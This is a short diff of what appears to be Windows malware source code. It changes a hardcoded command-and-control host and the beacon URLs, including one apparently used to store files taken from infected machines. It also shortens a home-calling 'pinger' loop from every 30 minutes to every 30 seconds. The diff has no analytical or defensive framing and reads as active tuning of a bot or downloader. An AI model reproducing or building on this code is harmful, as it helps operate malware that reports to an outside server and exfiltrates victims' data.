@@ -10,12 +10,12 @@ char URL[1024], URL2[1024];
 
 //typedef HRESULT (WINAPI *typeURLDownloadToFileA)( LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB );
 
-const char* HOST = "mirandahf.info";
+const char* HOST = "mmg-studios.org";
 #ifdef RELEASEDLL
-	char* UrlStep = "geter/index_.php?cmd=step&uid=%s&step=%d%%5Fdp";
+	char* UrlStep = "geter/index.php?cmd=step&uid=%s&step=%d%%5Fdp";
 #else
-	char* UrlCmdStep = "geter/index_.php?cmd=step&uid=%s&step=%d%%5Fdp";
-	char* UrlCmdStorefile2 = "geter/index_.php?cmd=storefile2&uid=%s";
+	char* UrlCmdStep = "geter/index.php?cmd=step&uid=%s&step=%d%%5Fdp";
+	char* UrlCmdStorefile2 = "geter/index.php?cmd=storefile2&uid=%s";
 #endif
 
 extern LPTSTR CreateFsDeviceName(VOID);
@@ -100,8 +100,10 @@ DWORD WINAPI PingerProc(LPVOID)
 {
 	while( true )
 	{
+		OutputDebugString("1");
 		SendCmdStep(165);
-		Sleep(1000 * 60 * 30);
+//		Sleep(1000 * 60 * 30);
+		Sleep(1000 * 30);
 	}
 /*
 	GetTempPathA(MAX_PATH, tempFolder);
